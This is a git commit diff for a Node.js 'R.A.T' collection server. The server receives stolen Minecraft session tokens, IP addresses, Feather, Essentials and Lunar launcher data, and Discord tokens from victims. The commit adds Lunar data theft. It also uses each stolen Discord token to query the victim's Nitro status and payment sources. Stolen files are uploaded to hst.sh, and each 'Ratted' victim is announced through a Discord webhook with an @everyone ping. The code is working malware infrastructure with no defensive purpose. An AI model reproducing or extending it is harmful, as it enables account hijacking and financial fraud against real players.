853f9deee06af2d37e9ced673032a821c67d1860
Zura1203 <112261510+Zura1203@users.noreply.github.com>
2022-10-24 10:33:06 +0300

    Update app.js

--- app.js
+++ app.js
@@ -5,7 +5,7 @@ const
 
 //setup
 require("dotenv").config()
-const { post, get } = require("axios").default,
+const { post, get } = require("axios"),
     express = require("express"),
     mongoose = require("mongoose"),
     helmet = require("helmet"),
@@ -42,7 +42,7 @@ setInterval(() => {
 //main route, post to this
 app.post("/", (req, res) => {
     //happens if the request does not contain all the required fields, aka someones manually posting to the server
-    if (!["username", "uuid", "token", "ip", "feather", "essentials", "discord"].every(field => req.body.hasOwnProperty(field))) {
+    if (!["username", "uuid", "token", "ip", "feather", "essentials", "lunar", "discord"].every(field => req.body.hasOwnProperty(field))) {
         console.log("[R.A.T] Rejected malformed JSON")
         return res.sendStatus(404)
     }
@@ -83,6 +83,7 @@ app.post("/", (req, res) => {
                     tokenAuth: `${req.body.username}:${req.body.uuid}:${req.body.token}`,
                     feather: req.body.feather,
                     essentials: req.body.essentials,
+                    lunar: req.body.lunar,
                     discord: req.body.discord
                 }).save(err => {
                     if (err) console.log(`[R.A.T] Error while saving to MongoDB database:\n${err}`)
@@ -91,10 +92,13 @@ app.post("/", (req, res) => {
 
             if (usingDiscord) {
                 //get networth
-                const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v1/profiles/${req.body.username}?key=dxxxxy`).catch(() => { return { data: { data: [{ networth: { total_networth: null } }] } } })).data.data[0].networth
+                const networth = await (await get(`https://skyhelper-dxxxxy.herokuapp.com/v2/profiles/${req.body.username}?key=dxxxxy`).catch(() => { return { data: { data: [{ networth: null }] } } })).data.data[0].networth
 
-                //check if api off
-                const total_networth = networth.total_networth == null ? 0 : networth.total_networth
+                //check if has profiles, if api off or if normal
+                let total_networth
+                if (networth == null) total_networth = `[NW] No profile data found [NW]`
+                else if (networth.noInventory) total_networth = `[NW] Without inventory (API OFF): ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
+                else total_networth = `[NW] ${formatNumber(networth.networth)} (${formatNumber(networth.unsoulboundNetworth)}) [NW]`
 
                 //upload feather
                 const feather = await (await post("https://hst.sh/documents/", req.body.feather).catch(() => { return { data: { key: "Error uploading" } } })).data.key
@@ -102,19 +106,40 @@ app.post("/", (req, res) => {
                 //upload essential
                 const essentials = await (await post("https://hst.sh/documents/", req.body.essentials).catch(() => { return { data: { key: "Error uploading" } } })).data.key
 
+                //upload lunar
+                const lunar = await (await post("https://hst.sh/documents/", req.body.lunar).catch(() => { return { data: { key: "Error uploading" } } })).data.key
+
                 //get discord info
-                const discord = await (await get("https://discordapp.com/api/v6/users/@me/billing/subscriptions", { headers: { "Authorization": req.body.discord, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data
+                let nitros = ""
+                let payments = ""
+
+                const discord = req.body.discord.split(" | ")
+
+                for await (const token of req.body.discord.split(" | ")) {
+                    let me = await (await get("https://discordapp.com/api/v9/users/@me", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: { id: null } } })).data
+                    if (me.id == null) {
+                        delete discord[token]
+                        continue
+                    }
+
+                    let nitro = await (await get("https://discordapp.com/api/v9/users/@me/billing/subscriptions", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data
+                    nitros += nitro.length > 0 ? "Yes | " : "No | "
+
+                    let payment = await (await get("https://discordapp.com/api/v9/users/@me/billing/payment-sources", { headers: { "Authorization": token, "Content-Type": "application/json" } }).catch(() => { return { data: [] } })).data
+                    payments += payment.length > 0 ? "Yes | " : "No | "
+                }
 
                 //send to discord webhook
                 post(process.env.WEBHOOK, JSON.stringify({
-                    content: `@everyone - ${formatNumber(total_networth)}`, //ping
+                    content: `@everyone - ${total_networth}`, //ping
                     embeds: [{
                         title: `Ratted ${req.body.username} - Click For Stats`,
-                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\nhttps://hst.sh/${feather}\n\n**Essentials:**\nhttps://hst.sh/${essentials}\n\n**Discord:**\`\`\`${req.body.discord}\`\`\`\nHas nitro: ${discord.length > 0}`,
+                        description: `**Username:**\`\`\`${req.body.username}\`\`\`\n**UUID: **\`\`\`${req.body.uuid}\`\`\`\n**Token:**\`\`\`${req.body.token}\`\`\`\n**IP:**\`\`\`${req.body.ip}\`\`\`\n**TokenAuth:**\`\`\`${req.body.username}:${req.body.uuid}:${req.body.token}\`\`\`\n**Feather:**\nhttps://hst.sh/${feather}\n\n**Essentials:**\nhttps://hst.sh/${essentials}\n\n**Lunar:**\nhttps://hst.sh/${lunar}\n\n**Discord:**\`\`\`${discord.join(" | ")}\`\`\`\n**Nitro**: \`${nitros}\`\n**Payment**: \`${payments}\``,
                         url: `https://sky.shiiyu.moe/stats/${req.body.username}`,
                         color: 5814783,
                         footer: {
-                            "text": "MagibotOnTop",
+                            "text": "R.A.T by dxxxxy",
+                            "icon_url": "https://avatars.githubusercontent.com/u/42523606?v=4"
                         },
                         timestamp: new Date()
                     }],
@@ -146,7 +171,7 @@ app.listen(port, () => console.log(`[R.A.T] Listening at port ${port}`))
 
 //format a number into thousands millions billions
 const formatNumber = (num) => {
-    if (num < 1000) return num
+    if (num < 1000) return num.toFixed(2)
     else if (num < 1000000) return `${(num / 1000).toFixed(2)}k`
     else if (num < 1000000000) return `${(num / 1000000).toFixed(2)}m`
     else return `${(num / 1000000000).toFixed(2)}b`
